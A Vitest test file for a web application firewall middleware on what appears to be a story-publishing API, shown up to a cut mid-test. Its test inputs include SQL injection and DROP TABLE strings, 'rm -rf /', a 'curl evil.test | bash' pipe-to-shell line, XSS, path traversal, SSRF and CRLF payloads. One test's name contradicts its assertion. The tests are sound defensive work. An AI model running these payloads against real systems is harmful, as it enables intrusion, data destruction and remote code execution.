import { describe, it, expect, beforeEach, vi } from 'vitest';
import { Request, Response, NextFunction } from 'express';

import { DEFAULT_WAF_CONFIG, buildWafConfig, type WafConfig } from '../../config/waf.config.ts';
import { WinstonLoggerService } from '../services/winston-logger.service.ts';
import { IpBlocklistService, type BlockOptions, type BlockRecord } from '../waf/ip-blocklist.service.ts';
import { WAF_RESPONSE_HEADERS } from '../waf/headers.ts';
import { WAF_RULES, WAF_SEVERITY_RANK, type WafPatternRule } from '../waf/rules.ts';

import { WafMiddleware, clientIpOf, resolveClientIp } from './waf.middleware.ts';

type MockWinstonLoggerService = {
  info: ReturnType<typeof vi.fn>;
  log: ReturnType<typeof vi.fn>;
  error: ReturnType<typeof vi.fn>;
  warn: ReturnType<typeof vi.fn>;
  debug: ReturnType<typeof vi.fn>;
  verbose: ReturnType<typeof vi.fn>;
};

class FakeBlocklist {
  blocked: Map<string, BlockRecord> = new Map();
  blocks: BlockOptions[] = [];
  violations = 0;
  failIsBlocked = false;
  recordViolationThrows = false;

  async isBlocked(ip: string): Promise<BlockRecord | null> {
    if (this.failIsBlocked) {
      throw new Error('valkey unavailable');
    }
    return this.blocked.get(ip) ?? null;
  }

  async block(ip: string, options: BlockOptions): Promise<boolean> {
    if (this.failIsBlocked) {
      return false;
    }
    this.blocks.push(options);
    this.blocked.set(ip, {
      ip,
      kind: options.kind,
      reason: options.reason,
      ruleId: options.ruleId ?? null,
      blockedAt: 0,
      expiresAt: null,
    });
    return true;
  }

  async recordViolation(): Promise<number> {
    if (this.recordViolationThrows) {
      return 0;
    }
    this.violations += 1;
    return this.violations;
  }
}

const patternRules = WAF_RULES.filter((rule): rule is WafPatternRule => rule.kind === 'pattern');

type MockRequest = {
  url: string;
  originalUrl: string;
  body: unknown;
  query: Record<string, unknown>;
  headers: Record<string, string | string[] | undefined>;
  ip: string;
  socket: { remoteAddress?: string };
  method: string;
};

function makeRequest(overrides: Partial<MockRequest> = {}): MockRequest {
  return {
    url: '/api/v1/stories',
    originalUrl: '/api/v1/stories',
    body: {},
    query: {},
    headers: {},
    ip: '127.0.0.1',
    socket: { remoteAddress: '127.0.0.1' },
    method: 'GET',
    ...overrides,
  };
}

describe('WafMiddleware', () => {
  let logger: MockWinstonLoggerService;
  let blocklist: FakeBlocklist;
  let config: WafConfig;
  let middleware: WafMiddleware;

  function build(): WafMiddleware {
    return new WafMiddleware(
      logger as unknown as WinstonLoggerService,
      blocklist as unknown as IpBlocklistService,
      config,
    );
  }

  function buildWithConfig(overrides: Partial<WafConfig>): WafMiddleware {
    return new WafMiddleware(logger as unknown as WinstonLoggerService, blocklist as unknown as IpBlocklistService, {
      ...config,
      ...overrides,
    });
  }

  beforeEach(() => {
    logger = {
      info: vi.fn(),
      log: vi.fn(),
      error: vi.fn(),
      warn: vi.fn(),
      debug: vi.fn(),
      verbose: vi.fn(),
    };
    blocklist = new FakeBlocklist();
    config = { ...DEFAULT_WAF_CONFIG, violationsBeforeTempBlock: 3, violationsBeforePermanentBlock: 10 };
    middleware = build();
  });

  describe('regression: the old blanket apostrophe / hash / dash rule', () => {
    it.each([
      { label: 'a single apostrophe', body: { content: "It's a long way to go." } },
      { label: 'several apostrophes', body: { content: "O'Brien's, D'Angelo's and Maalouf's stories" } },
      { label: 'a hash character', body: { content: 'Chapter 1 # the beginning' } },
      {
        label: 'a double dash em-dash style',
        body: { content: 'A tale -- told in three acts -- of a wandering bard' },
      },
      { label: 'URL-encoded apostrophes', body: { content: 'It%27s a %23 %2D%2D test' } },
      { label: 'the word SQL in prose', body: { content: 'She wrote about SQL databases in her novel.' } },
      { label: 'an apostrophe in a query string', body: {}, query: { q: "l'amour" } },
      { label: 'a hash in a query string', body: {}, query: { q: 'book #3' } },
      { label: 'a double dash in a query string', body: {}, query: { q: 'well--known' } },
    ])('ALLOWS $label in a request', async ({ body, query }) => {
      const req = makeRequest({ method: 'POST', body, query });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations).toEqual([]);
      expect(decision.allowed).toBe(true);
    });

    it('ALLOWS a full Arabic story containing an apostrophe, a hash and dashes', async () => {
      const req = makeRequest({
        method: 'POST',
        body: {
          title: "قصة 'الغراب' -- الجزء #2",
          content:
            "قال الأديب: «إنّ الحكاية تُروى -- ولو مرّةً -- في كلّ ليلة»، ثمّ صمت. لم يكن '--' يعني شيئاً هنا، ولا '#'.",
        },
      });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
      expect(decision.violations).toEqual([]);
    });

    it('no rule in the rule list matches a bare apostrophe, hash or double dash', () => {
      for (const rule of patternRules) {
        for (const value of ["'", '#', '--', "it's", 'a # b', 'a -- b', '%27', '%23']) {
          if (!rule.targets.includes('body')) {
            continue;
          }
          expect(rule.pattern.test(value), `rule ${rule.id} must not match ${JSON.stringify(value)} in a body`).toBe(
            false,
          );
        }
      }
    });
  });

  describe('rule set integrity', () => {
    it('has unique rule ids', () => {
      const ids = WAF_RULES.map((rule) => rule.id);
      expect(new Set(ids).size).toBe(ids.length);
    });

    it('uses only non-global regexes so evaluation is stateless', () => {
      for (const rule of WAF_RULES) {
        if (rule.kind === 'pattern') {
          expect(rule.pattern.global, `${rule.id} must not use the /g flag`).toBe(false);
        }
      }
    });

    it('declares a non-empty sample and a sample target for every rule', () => {
      for (const rule of WAF_RULES) {
        expect(rule.sample.length, `${rule.id} sample`).toBeGreaterThan(0);
        expect(['url', 'query', 'body', 'header'], `${rule.id} sampleTarget`).toContain(rule.sampleTarget);
      }
    });

    it('every pattern rule fires on its own sample when targeted at its sample target', () => {
      for (const rule of WAF_RULES) {
        if (rule.kind !== 'pattern') {
          continue;
        }
        if (rule.optInControl !== undefined) {
          // Opt-in rules are inert with the default config, so "fires on its sample"
          // cannot hold here without also asserting the control is on. That is asserted
          // separately, in both directions.
          continue;
        }
        const request = makeRequest({
          url: rule.sampleTarget === 'url' ? rule.sample : '/api/v1/stories',
          originalUrl: rule.sampleTarget === 'url' ? rule.sample : '/api/v1/stories',
          query: rule.sampleTarget === 'query' ? { probe: rule.sample } : {},
          headers: rule.sampleTarget === 'header' ? { 'user-agent': 'x', probe: rule.sample } : {},
          body: rule.sampleTarget === 'body' ? { probe: rule.sample } : {},
        });
        const fired = middleware.evaluate(request as unknown as Request).map((violation) => violation.ruleId);
        expect(fired, `rule ${rule.id} did not fire on its own sample`).toContain(rule.id);
      }
    });

    it('never leaves an opt-in rule with a stale pattern', () => {
      // Asserted through the full inspection path (decode + evaluate) rather than
      // `pattern.test(sample)`, because some samples are percent-encoded and only match
      // after `decodeForInspection`.
      const optedIn = new WafMiddleware(
        logger as unknown as WinstonLoggerService,
        blocklist as unknown as IpBlocklistService,
        { ...config, blockForwardingHeaders: true, enabledOptInControls: ['blockForwardingHeaders'] },
      );

      for (const rule of WAF_RULES.filter((candidate) => candidate.optInControl !== undefined)) {
        const request = makeRequest({
          headers: rule.sampleTarget === 'header' ? { [rule.sample]: 'x' } : {},
          query: rule.sampleTarget === 'query' ? { probe: rule.sample } : {},
          url: rule.sampleTarget === 'url' ? rule.sample : '/api/v1/stories',
          originalUrl: rule.sampleTarget === 'url' ? rule.sample : '/api/v1/stories',
          body: rule.sampleTarget === 'body' ? { probe: rule.sample } : {},
        });
        expect(optedIn.evaluate(request as unknown as Request).map((violation) => violation.ruleId)).toContain(rule.id);
      }
    });

    it('an opt-in rule only fires when its control is enabled', () => {
      // The forwarding-header rule is deliberately excluded from the loop above: with
      // the default config it MUST NOT fire, or the sample test would pass only because
      // the deployment happens to look like a direct-to-internet one.
      const optedIn = new WafMiddleware(
        logger as unknown as WinstonLoggerService,
        blocklist as unknown as IpBlocklistService,
        {
          ...config,
          blockForwardingHeaders: true,
          enabledOptInControls: ['blockForwardingHeaders'],
        },
      );
      const request = makeRequest({ headers: { 'x-original-url': 'x-original-url' } });

      expect(middleware.evaluate(request as unknown as Request)).toEqual([]);
      expect(optedIn.evaluate(request as unknown as Request).map((violation) => violation.ruleId)).toContain(
        'header-forbidden-forwarding-headers',
      );
    });
  });

  describe('injection layer', () => {
    it('blocks a SQL tautology in a query string', async () => {
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-tautology');
    });

    it('blocks a stacked statement in a query string', async () => {
      const req = makeRequest({ query: { id: '1; DROP TABLE users' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-stacked-query');
    });

    it('blocks a trailing SQL comment in a query string', async () => {
      const req = makeRequest({ url: '/api/v1/users?id=1--', originalUrl: '/api/v1/users?id=1--' });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-comment-terminator');
    });

    it('blocks a DML statement in a query string', async () => {
      const req = makeRequest({ query: { q: "' UNION ALL SELECT * FROM users --" } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-dml-statement');
    });

    it('blocks a time-based blind injection in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { content: '1 AND SLEEP(5)' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-time-based');
    });

    it('blocks a NoSQL operator injection in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { username: { $ne: null } } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('nosql-operator-injection');
    });

    it('blocks an LDAP filter injection in a query string', async () => {
      const req = makeRequest({ query: { user: '*)(|(uid=*)' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('ldap-filter-injection');
    });

    it('blocks a command chain in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { content: 'hello; rm -rf /' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('command-chain-separator');
    });

    it('blocks a reverse shell pipe in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { content: 'curl http://evil.test/x | bash' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('command-pipe-to-shell');
    });

    it('does not flag an ampersand between two words', async () => {
      const req = makeRequest({ method: 'POST', body: { content: 'Tom & Jerry, Lila & Mohamed' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
    });
  });

  describe('xss layer', () => {
    it('blocks a script tag in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { content: '<script>alert(1)</script>' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('xss-script-tag');
    });

    it('blocks a percent-encoded script tag in a query string', async () => {
      const req = makeRequest({ query: { q: '%3Cscript%3Ealert(1)%3C/script%3E' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('xss-script-tag');
    });

    it('blocks an inline event handler in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { content: '<img src=x onerror=alert(1)>' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('xss-event-handler');
    });

    it('does not flag prose that merely contains the word "on click"', async () => {
      const req = makeRequest({ method: 'POST', body: { content: 'The runner moved on click of the bell.' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
    });
  });

  describe('traversal layer', () => {
    it.each([
      '/api/v1/files/../../../etc/passwd',
      '/api/v1/files/..%2F..%2Fetc%2Fpasswd',
      '/api/v1/files/..\\..\\windows\\system32',
    ])('blocks traversal in %s', async (url) => {
      const req = makeRequest({ url, originalUrl: url });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('traversal-relative-segment');
    });

    it('blocks a null byte in a query string', async () => {
      const req = makeRequest({ query: { file: 'image.png%00.php' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('traversal-null-byte');
    });
  });

  describe('ssrf layer', () => {
    it('blocks the cloud metadata endpoint in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { coverUrl: 'http://169.254.169.254/latest/meta-data/' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('ssrf-cloud-metadata');
    });

    it('blocks a private-network URL in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { coverUrl: 'http://192.168.1.1/admin' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('ssrf-private-network');
    });

    it('blocks a file:// scheme in a body', async () => {
      const req = makeRequest({ method: 'POST', body: { coverUrl: 'file:///etc/passwd' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('ssrf-non-http-scheme');
    });

    it('does not flag the word "dictionary" in prose', async () => {
      const req = makeRequest({ method: 'POST', body: { content: 'He kept a dictionary under his pillow.' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
    });
  });

  describe('header-injection layer', () => {
    it('blocks a CRLF sequence in a query string', async () => {
      const req = makeRequest({ query: { title: 'a%0d%0aSet-Cookie:%20admin=1' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('header-crlf-injection');
    });

    it('ALLOWS a proxy-supplied X-Forwarded-Host by default', async () => {
      // The regression this guards: enabled by default at severity `high`, this rule
      // 403'd EVERY request behind any reverse proxy or load balancer that emits
      // X-Forwarded-Host, and incremented the per-IP violation counter toward a
      // temporary and then a permanent block. A proxied deployment locked itself out.
      const req = makeRequest({ headers: { 'X-Forwarded-Host': 'app.hakawi.test' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations).toEqual([]);
      expect(decision.allowed).toBe(true);
    });

    it('ALLOWS every other forwarding header by default', async () => {
      for (const header of [
        'X-Forwarded-Host',
        'X-Original-URL',
        'X-Rewrite-URL',
        'X-Originating-IP',
        'X-Custom-IP-Authorization',
        'X-Forwarded-Server',
      ]) {
        const decision = await middleware.decide(makeRequest({ headers: { [header]: 'x' } }) as unknown as Request);

        expect(decision.allowed, `${header} must not block by default`).toBe(true);
        expect(decision.violations.map((violation) => violation.ruleId)).not.toContain(
          'header-forbidden-forwarding-headers',
        );
      }
    });

    it('still blocks a client supplied X-Original-URL once the operator opts in', async () => {
      const optedIn = buildWithConfig({
        blockForwardingHeaders: true,
        enabledOptInControls: ['blockForwardingHeaders'],
      });
      const req = makeRequest({ headers: { 'X-Original-URL': '/admin/waf/blocked-ips' } });
      const decision = await optedIn.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('header-forbidden-forwarding-headers');
    });

    it('blocks a forwarding header even when the flag is on but the rule is explicitly disabled', async () => {
      const contradictory = buildWithConfig({
        blockForwardingHeaders: true,
        enabledOptInControls: ['blockForwardingHeaders'],
        disabledRules: ['header-forbidden-forwarding-headers'],
      });
      const decision = await contradictory.decide(
        makeRequest({ headers: { 'X-Original-URL': '/admin' } }) as unknown as Request,
      );

      expect(decision.allowed).toBe(true);
    });
  });

  describe('body-size layer', () => {
    it('rejects an oversized Content-Length with 413', async () => {
      const req = makeRequest({
        method: 'POST',
        body: {},
        headers: { 'content-length': String(config.maxRequestSizeBytes + 1) },
      });
      const response = createResponse();
      const next = vi.fn();

      middleware.use(req as unknown as Request, response as unknown as Response, next as NextFunction);
      await flush();

      expect(response.status).toHaveBeenCalledWith(413);
      expect(next).not.toHaveBeenCalled();
    });

    it('allows a body at exactly the configured limit', async () => {
      const req = makeRequest({
        method: 'POST',
        headers: { 'content-length': String(config.maxRequestSizeBytes) },
      });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
    });
  });

  describe('method layer', () => {
    it('blocks a method outside the allow-list', async () => {
      const req = makeRequest({ method: 'TRACE' });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('method-not-allowed');
    });

    it('allows every method in the configured allow-list', async () => {
      for (const method of config.allowedMethods) {
        const req = makeRequest({ method });
        const decision = await middleware.decide(req as unknown as Request);
        expect(decision.allowed, `${method} must be allowed`).toBe(true);
      }
    });
  });

  describe('bot layer', () => {
    it('blocks a known scanner user agent', async () => {
      const req = makeRequest({ headers: { 'user-agent': 'sqlmap/1.7.2#stable' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('bot-scanner-user-agent');
    });

    it('logs but does not block python-requests at the default severity', async () => {
      const req = makeRequest({ headers: { 'user-agent': 'python-requests/2.31.0' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(true);
      expect(decision.violations.map((violation) => violation.ruleId)).toContain('bot-automation-user-agent');
      expect(logger.warn).toHaveBeenCalled();
    });
  });

  describe('severity handling', () => {
    const MEDIUM_RULE_BODY = { content: 'I wrote eval(payload) in my novel about hackers.' };
    const HIGH_RULE_PATH = '/api/v1/files/../../../etc/passwd';

    it('logs but allows a low-severity violation at the default threshold', async () => {
      const req = makeRequest({ headers: { 'user-agent': 'python-requests/2.31.0' } });
      const decision = await middleware.decide(req as unknown as Request);

      const violation = decision.violations[0];
      expect(violation).toBeDefined();
      expect(WAF_SEVERITY_RANK[violation?.severity ?? 'low']).toBeLessThan(WAF_SEVERITY_RANK[config.blockSeverity]);
      expect(decision.allowed).toBe(true);
    });

    it('logs but allows a medium-severity violation at the default threshold', async () => {
      const req = makeRequest({ method: 'POST', body: MEDIUM_RULE_BODY });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations.map((violation) => violation.ruleId)).toContain('sql-exec-eval');
      expect(decision.allowed).toBe(true);
    });

    it('blocks a medium-severity violation when the threshold is lowered to medium', async () => {
      config = { ...config, blockSeverity: 'medium' };
      middleware = build();
      const req = makeRequest({ method: 'POST', body: MEDIUM_RULE_BODY });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
    });

    it('blocks nothing when the threshold is critical and only medium rules fire', async () => {
      config = { ...config, blockSeverity: 'critical' };
      middleware = build();
      const req = makeRequest({ method: 'POST', body: MEDIUM_RULE_BODY });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations.length).toBeGreaterThan(0);
      expect(decision.allowed).toBe(true);
    });

    it('still blocks critical rules when the threshold is critical', async () => {
      config = { ...config, blockSeverity: 'critical' };
      middleware = build();
      const req = makeRequest({ url: HIGH_RULE_PATH, originalUrl: HIGH_RULE_PATH });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
    });

    it('honours blockOnViolation=false by only logging', async () => {
      config = { ...config, blockOnViolation: false };
      middleware = build();
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations.length).toBeGreaterThan(0);
      expect(decision.allowed).toBe(true);
      expect(logger.warn).toHaveBeenCalled();
    });
  });

  describe('configuration', () => {
    it('honours WAF_ENABLED=false', async () => {
      config = { ...config, enabled: false };
      middleware = build();
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.violations).toEqual([]);
      expect(decision.allowed).toBe(true);
    });

    it('honours WAF_DISABLED_RULES by id', async () => {
      config = {
        ...config,
        disabledRules: [
          'sql-tautology',
          'xss-script-tag',
          'xss-script-function',
          'traversal-relative-segment',
          'traversal-sensitive-file',
        ],
      };
      middleware = build();

      for (const [url, query, body] of [
        ['/api/v1/search', { q: "' OR '1'='1" }, {}],
        ['/api/v1/search', { q: '<script>alert(1)</script>' }, {}],
        ['/api/v1/files/../../../etc/passwd', {}, {}],
      ] as const) {
        const req = makeRequest({ url, originalUrl: url, query, body });
        const decision = await middleware.decide(req as unknown as Request);
        expect(decision.allowed, `expected ${String(url)} to pass`).toBe(true);
      }
    });

    it('honours WAF_LOG_VIOLATIONS=false', async () => {
      config = { ...config, logViolations: false, blockSeverity: 'critical' };
      middleware = build();
      const req = makeRequest({ method: 'POST', body: { content: 'hello; rm -rf /' } });
      await middleware.decide(req as unknown as Request);

      expect(logger.warn).not.toHaveBeenCalled();
    });

    it('builds a config from the documented environment variables', () => {
      const built = buildWafConfig({
        WAF_ENABLED: 'true',
        WAF_BLOCK_SEVERITY: 'medium',
        WAF_MAX_REQUEST_SIZE: '2048',
        WAF_ALLOWED_METHODS: 'GET, POST',
        WAF_TEMP_BLOCK_SECONDS: '60',
        WAF_DISABLED_RULES: 'xss-script-tag, sql-tautology',
        WAF_FAIL_MODE: 'closed',
      });

      expect(built.blockSeverity).toBe('medium');
      expect(built.maxRequestSizeBytes).toBe(2048);
      expect(built.allowedMethods).toEqual(['GET', 'POST']);
      expect(built.tempBlockSeconds).toBe(60);
      expect(built.disabledRules).toEqual(['xss-script-tag', 'sql-tautology']);
      expect(built.failMode).toBe('closed');
    });

    it('falls back to the default config when none is injected', async () => {
      const fallbackMiddleware = new WafMiddleware(
        logger as unknown as WinstonLoggerService,
        blocklist as unknown as IpBlocklistService,
        null,
      );
      const decision = await fallbackMiddleware.decide(makeRequest() as unknown as Request);

      expect(decision.allowed).toBe(true);
      expect(DEFAULT_WAF_CONFIG.enabled).toBe(true);
    });
  });

  describe('IP blocklist integration', () => {
    it('blocks a request from a blocked IP without running the rules', async () => {
      blocklist.blocked.set('203.0.113.9', {
        ip: '203.0.113.9',
        kind: 'permanent',
        reason: 'critical:xss-script-tag',
        ruleId: 'xss-script-tag',
        blockedAt: 0,
        expiresAt: null,
      });
      const req = makeRequest({ ip: '203.0.113.9', query: { q: 'harmless' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.blockRecord?.reason).toBe('critical:xss-script-tag');
      expect(decision.violations).toEqual([]);
    });

    it('permanently blocks the IP on a critical violation', async () => {
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      await middleware.decide(req as unknown as Request);

      const critical = blocklist.blocks.find((entry) => entry.kind === 'permanent');
      expect(critical).toBeDefined();
      expect(critical?.ruleId).toBe('sql-tautology');
    });

    it('temporarily blocks the IP once the violation threshold is reached', async () => {
      blocklist.violations = 2;
      const req = makeRequest({ method: 'POST', body: { content: '<script>alert(1)</script>' } });
      await middleware.decide(req as unknown as Request);

      const temporary = blocklist.blocks.find((entry) => entry.kind === 'temporary');
      expect(temporary).toBeDefined();
      expect(temporary?.ttlSeconds).toBe(config.tempBlockSeconds);
    });

    it('does not block the IP for a violation below the temporary threshold', async () => {
      const lenient = buildWithConfig({ violationsBeforeTempBlock: 5, violationsBeforePermanentBlock: 100 });
      const req = makeRequest({ method: 'POST', body: { content: '<script>alert(1)</script>' } });
      await lenient.decide(req as unknown as Request);

      expect(blocklist.blocks).toHaveLength(0);
    });
  });

  describe('fail open / fail closed', () => {
    it('fails open by default when the blocklist store throws', async () => {
      blocklist.failIsBlocked = true;
      const decision = await middleware.decide(makeRequest() as unknown as Request);

      expect(decision.allowed).toBe(true);
      expect(logger.error).toHaveBeenCalled();
    });

    it('fails closed when WAF_FAIL_MODE=closed and the store throws', async () => {
      config = { ...config, failMode: 'closed' };
      middleware = build();
      blocklist.failIsBlocked = true;
      const decision = await middleware.decide(makeRequest() as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.blockRecord?.reason).toBe('waf-fail-closed');
    });

    it('fails open with next() when evaluation itself throws and fail mode is open', async () => {
      const exploding = build();
      exploding['evaluate'] = () => {
        throw new Error('boom');
      };
      const response = createResponse();
      const next = vi.fn();

      exploding.use(makeRequest() as unknown as Request, response as unknown as Response, next as NextFunction);
      await flush();

      expect(next).toHaveBeenCalledTimes(1);
      expect(response.status).not.toHaveBeenCalled();
    });

    it('fails closed with 503 when evaluation throws and fail mode is closed', async () => {
      config = { ...config, failMode: 'closed' };
      const exploding = build();
      exploding['evaluate'] = () => {
        throw new Error('boom');
      };
      const response = createResponse();
      const next = vi.fn();

      exploding.use(makeRequest() as unknown as Request, response as unknown as Response, next as NextFunction);
      await flush();

      expect(response.status).toHaveBeenCalledWith(503);
      expect(next).not.toHaveBeenCalled();
    });
  });

  describe('response shape', () => {
    it('sets the correlation id and the WAF headers on a blocked request', async () => {
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      const response = createResponse();
      const next = vi.fn();

      middleware.use(req as unknown as Request, response as unknown as Response, next as NextFunction);
      await flush();

      expect(next).not.toHaveBeenCalled();
      expect(response.setHeader).toHaveBeenCalledWith(WAF_RESPONSE_HEADERS.blocked, 'true');
      expect(response.setHeader).toHaveBeenCalledWith(WAF_RESPONSE_HEADERS.rule, expect.any(String));
      expect(response.setHeader).toHaveBeenCalledWith(WAF_RESPONSE_HEADERS.severity, expect.any(String));
      expect(response.setHeader).toHaveBeenCalledWith(WAF_RESPONSE_HEADERS.requestId, expect.any(String));
      expect(response.status).toHaveBeenCalledWith(403);
    });

    it('returns 403 with the block reason for a blocked IP', async () => {
      blocklist.blocked.set('198.51.100.7', {
        ip: '198.51.100.7',
        kind: 'temporary',
        reason: 'repeated-violations:command-chain-separator',
        ruleId: 'command-chain-separator',
        blockedAt: 0,
        expiresAt: null,
      });
      const response = createResponse();
      const next = vi.fn();

      middleware.use(
        makeRequest({ ip: '198.51.100.7' }) as unknown as Request,
        response as unknown as Response,
        next as NextFunction,
      );
      await flush();

      expect(response.status).toHaveBeenCalledWith(403);
      expect(response.json).toHaveBeenCalledWith(
        expect.objectContaining({
          error: 'Source IP is blocked',
          reason: 'repeated-violations:command-chain-separator',
        }),
      );
    });

    it('reuses an inbound X-Request-Id as the correlation id', async () => {
      const req = makeRequest({ headers: { 'x-request-id': 'abc-123' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.correlationId).toBe('abc-123');
    });

    it('replaces an invalid inbound X-Request-Id', async () => {
      const req = makeRequest({ headers: { 'x-request-id': 'bad id with spaces!' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.correlationId).not.toBe('bad id with spaces!');
    });

    it('logs a structured JSON violation record', async () => {
      const req = makeRequest({ query: { q: "' OR '1'='1" } });
      await middleware.decide(req as unknown as Request);

      const call = logger.warn.mock.calls[0];
      expect(call?.[1]).toBe('WafMiddleware');
      const payload: unknown = JSON.parse(String(call?.[0]));
      expect(payload).toEqual(
        expect.objectContaining({ message: 'WAF violation detected', ip: '127.0.0.1', action: 'blocked' }),
      );
    });
  });

  describe('inspection limits', () => {
    it('ignores a null body', () => {
      expect(middleware.evaluate(makeRequest({ body: null }) as unknown as Request)).toEqual([]);
    });

    it('inspects nested body structures', () => {
      const req = makeRequest({
        method: 'POST',
        body: { story: { chapters: [{ text: 'he waited while the server did 1 AND SLEEP(5)' }] } },
      });
      const ruleIds = middleware.evaluate(req as unknown as Request).map((violation) => violation.ruleId);

      expect(ruleIds).toContain('sql-time-based');
    });

    it('does NOT apply stacked-statement detection to a stored body, only to the request target', async () => {
      const asBody = makeRequest({ method: 'POST', body: { content: "'; DROP TABLE stories; --" } });
      const asQuery = makeRequest({ query: { id: '1; DROP TABLE stories' } });

      expect(middleware.evaluate(asBody as unknown as Request)).toEqual([]);
      expect(middleware.evaluate(asQuery as unknown as Request).map((violation) => violation.ruleId)).toContain(
        'sql-stacked-query',
      );
    });

    it('derives the client ip from the socket when req.ip is missing', () => {
      const req = makeRequest({ ip: undefined as unknown as string, socket: { remoteAddress: '10.0.0.4' } });
      expect(clientIpOf(req as unknown as Request)).toBe('10.0.0.4');
    });
  });

  describe('client IP resolution and the trust proxy gate', () => {
    it('ignores a forged X-Forwarded-For unless proxies are trusted', () => {
      // The blocklist keys on this value. Trusting a client-settable header by default
      // would let an attacker rotate a fresh address per request and never accumulate a
      // violation or be blocked.
      const req = makeRequest({
        ip: '203.0.113.5',
        headers: { 'x-forwarded-for': '198.51.100.7' },
      });

      expect(resolveClientIp(req as unknown as Request, false)).toEqual({
        ip: '203.0.113.5',
        source: 'socket',
        trustProxy: false,
      });
    });

    it('honours X-Forwarded-For when the shared trust-proxy flag is on', () => {
      const req = makeRequest({
        ip: '203.0.113.5',
        headers: { 'x-forwarded-for': '198.51.100.7, 10.0.0.1' },
      });

      expect(resolveClientIp(req as unknown as Request, true)).toEqual({
        ip: '198.51.100.7',
        source: 'forwarded',
        trustProxy: true,
      });
    });

    it('falls back to the socket when trust-proxy is on but no forwarded header is present', () => {
      const req = makeRequest({ ip: '203.0.113.5', headers: {} });

      expect(resolveClientIp(req as unknown as Request, true).source).toBe('socket');
    });

    it('reports an unknown address rather than an empty one', () => {
      const req = makeRequest({ ip: undefined as unknown as string, socket: {} });

      expect(resolveClientIp(req as unknown as Request, false)).toEqual({
        ip: 'unknown',
        source: 'unknown',
        trustProxy: false,
      });
